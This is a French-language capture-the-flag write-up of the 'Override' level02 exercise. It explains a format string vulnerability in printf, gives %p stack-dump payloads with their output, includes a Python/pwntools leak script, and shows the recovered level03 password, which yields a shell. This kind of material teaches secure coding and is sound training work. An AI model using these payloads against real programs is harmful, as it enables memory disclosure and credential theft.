# üìò Override ‚Äì Level02

## üìù Description

Ce niveau du projet **Override** introduit une vuln√©rabilit√© de **format string**. Le programme lit le mot de passe du niveau suivant dans un fichier, le stocke en m√©moire, puis demande des credentials √† l'utilisateur. Une faille dans l'utilisation de `printf()` permet de lire directement le contenu de la stack et ainsi r√©cup√©rer le mot de passe stock√©.

L'objectif est d'exploiter cette vuln√©rabilit√© de format string pour extraire le mot de passe du niveau 03 directement depuis la m√©moire.

---

## üîç Analyse du binaire

### Code d√©sassembl√© (simplifi√©)

```c
undefined8 main(void)
{
  char local_118[112];  // Password input
  char local_a8[48];    // ‚Üê Le vrai password level03 !
  char local_78[100];   // Username input
  FILE *local_10;
  
  // Ouvre et lit le password du level03
  local_10 = fopen("/home/users/level03/.pass", "r");
  if (local_10 == NULL) {
    fwrite("ERROR: failed to open password file\n", 1, 0x24, stderr);
    exit(1);
  }
  
  fread(local_a8, 1, 0x29, local_10);  // Lit 41 octets dans local_a8
  local_a8[strcspn(local_a8, "\n")] = '\0';
  fclose(local_10);
  
  // Interface de login
  puts("===== [ Secure Access System v1.0 ] =====");
  puts("| You must login to access this system. |");
  
  printf("--[ Username: ");
  fgets(local_78, 100, stdin);
  local_78[strcspn(local_78, "\n")] = '\0';
  
  printf("--[ Password: ");
  fgets(local_118, 100, stdin);
  local_118[strcspn(local_118, "\n")] = '\0';
  
  // V√©rification du password
  if (strncmp(local_a8, local_118, 0x29) == 0) {
    printf("Greetings, %s!\n", local_78);
    system("/bin/sh");
    return 0;
  }
  
  printf(local_78);  // ‚ö†Ô∏è FORMAT STRING VULNERABILITY !
  puts(" does not have access!");
  exit(1);
}
```

### ‚úî Vuln√©rabilit√©s identifi√©es

1. **Format String Vulnerability** : `printf(local_78)` sans format string
   - Devrait √™tre : `printf("%s", local_78)`
   - Permet de lire/√©crire dans la m√©moire avec `%p`, `%x`, `%s`, etc.

2. **Password en m√©moire** : Le vrai password est stock√© dans `local_a8` sur la stack
   - Reste en m√©moire m√™me apr√®s la comparaison
   - Accessible via la vuln√©rabilit√© de format string

---

## üéØ Strat√©gie d'exploitation

### Plan d'attaque

1. Utiliser la vuln√©rabilit√© de format string dans le champ **Username**
2. Dumper le contenu de la stack avec des format specifiers (`%p`)
3. Localiser le password stock√© dans `local_a8`
4. D√©coder les valeurs hexad√©cimales en ASCII

### Sch√©ma m√©moire de la stack

```
Haute adresse
    ‚Üì
[Autres variables]
[local_118]  ‚Üê Password input (112 bytes)  ~ offset 35-40
[local_a8]   ‚Üê VRAI PASSWORD !  (48 bytes) ~ offset 21-26
[local_78]   ‚Üê Username input  (100 bytes) ~ offset 27
    ‚Üì
Basse adresse
```

---

## üîß M√©thodologie d'exploitation

### √âtape 1 : Localiser notre input sur la stack

On utilise un **marqueur** pour trouver notre position :

```bash
(echo "AAAA %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p"; echo "test") | ./level02
```

**R√©sultat** :
```
AAAA 0x7fffffffe500 (nil) 0x70 0x2a2a2a2a2a2a2a2a ... (nil) 0x2070252041414141 ...
                                                              ^^^^^^^^^^^^^^^^
                                                              Notre "AAAA" !
```

`0x41414141` (= "AAAA") appara√Æt √† **l'offset 27** ‚Üí c'est la position de `local_78` (username).

### √âtape 2 : Dump de la stack compl√®te

```bash
(echo "AAAA %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p"; echo "test") | ./level02
```

**Sortie pertinente** :
```
... 0x100000000 (nil) 0x756e505234376848 0x45414a3561733951 0x377a7143574e6758 0x354a35686e475873 0x48336750664b394d (nil) ...
                      ^^^^^^^^^^^^^^^^^^  ^^^^^^^^^^^^^^^^^^  ^^^^^^^^^^^^^^^^^^  ^^^^^^^^^^^^^^^^^^  ^^^^^^^^^^^^^^^^^^
                      Offset 21           Offset 22           Offset 23           Offset 24           Offset 25
```

### √âtape 3 : Identifier le password

Les valeurs aux **offsets 21-25** ne ressemblent pas √† des pointeurs et contiennent des caract√®res ASCII imprimables :

```
0x756e505234376848  ‚Üê 'u'(75) 'n'(6e) 'P'(50) 'R'(52) etc.
0x45414a3561733951  ‚Üê 'E'(45) 'A'(41) 'J'(4a) '5'(35) etc.
0x377a7143574e6758  ‚Üê '7'(37) 'z'(7a) 'q'(71) 'C'(43) etc.
```

Ces valeurs sont clairement du texte ‚Üí **c'est le password !**

### √âtape 4 : D√©coder les valeurs hexad√©cimales

Les valeurs sont en **little-endian** (x86-64), il faut inverser l'ordre des octets :

```python
#!/usr/bin/env python2
import struct

hex_values = [
    0x756e505234376848,
    0x45414a3561733951,
    0x377a7143574e6758,
    0x354a35686e475873,
    0x48336750664b394d
]

password = ''
for val in hex_values:
    # Convertir en little-endian (inverse l'ordre des octets)
    password += struct.pack('<Q', val)

print(password)
# Output: Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
```

**D√©codage manuel** :

```
0x756e505234376848 ‚Üí 48 48 37 34 52 50 6e 75 ‚Üí H h 7 4 R P n u
0x45414a3561733951 ‚Üí 51 39 73 61 35 4a 41 45 ‚Üí Q 9 s a 5 J A E
0x377a7143574e6758 ‚Üí 58 67 4e 57 43 71 7a 37 ‚Üí X g N W C q z 7
0x354a35686e475873 ‚Üí 73 58 47 68 6e 35 4a 35 ‚Üí s X G h n 5 J 5
0x48336750664b394d ‚Üí 4d 39 4b 66 50 67 33 48 ‚Üí M 9 K f P g 3 H
```

**Password complet** : `Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H`

---

## üöÄ Exploitation

### Commande compl√®te

```bash
level02@OverRide:~$ ./level02
===== [ Secure Access System v1.0 ] =====
/***************************************\
| You must login to access this system. |
\**************************************/
--[ Username: test
--[ Password: Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
*****************************************
Greetings, test!
$ whoami
level03
$ cat /home/users/level03/.pass
Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
```

### Script d'exploitation automatis√©

```python
#!/usr/bin/env python2
import struct
from pwn import *

# Lancer le programme
p = process('./level02')

# Payload pour dumper la stack
payload = "AAAA " + " ".join(["%{}$p".format(i) for i in range(1, 40)])

p.recvuntil('Username: ')
p.sendline(payload)
p.recvuntil('Password: ')
p.sendline('fake')

# R√©cup√©rer la sortie
output = p.recvall()
print(output)

# Extraire les valeurs hex et d√©coder
# (parser la sortie pour trouver les offsets 21-25)
```

---

## ‚úÖ R√©sum√©

| √âl√©ment                    | Valeur                                                          |
| -------------------------- | --------------------------------------------------------------- |
| Vuln√©rabilit√©              | Format String dans `printf(local_78)`                           |
| Variable cible             | `local_a8` (contient le password level03)                       |
| Position sur la stack      | Offsets 21-25 (depuis le format string)                         |
| Position de l'input        | Offset 27 (local_78)                                            |
| Technique                  | Stack leak via format string vulnerability                      |
| Valeurs hex extraites      | `0x756e505234376848`, `0x45414a3561733951`, etc.               |
| Password level03           | `Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H`                      |
| Gain                       | Shell en tant que *level03*                                     |

---

### Format String Basics

| Format | Description                    | Exemple                |
| ------ | ------------------------------ | ---------------------- |
| `%p`   | Affiche un pointeur (adresse)  | `0x7fffffffe500`       |
| `%x`   | Affiche en hexad√©cimal         | `41414141`             |
| `%s`   | Affiche une string             | `"hello"`              |
| `%N$p` | Affiche le Ni√®me argument      | `%21$p` ‚Üí offset 21    |
| `%N$s` | Lit une string au Ni√®me offset | `%21$s` ‚Üí lit le texte |

---

## üéì Le√ßons apprises

1. **Toujours utiliser des format strings** : `printf("%s", str)` au lieu de `printf(str)`
2. **La stack garde tout en m√©moire** : Les variables locales persistent jusqu'√† la fin de la fonction
3. **Format string = lecture/√©criture arbitraire** : Permet de dumper ou modifier la m√©moire
4. **Little-endian** : Sur x86-64, les octets sont stock√©s dans l'ordre inverse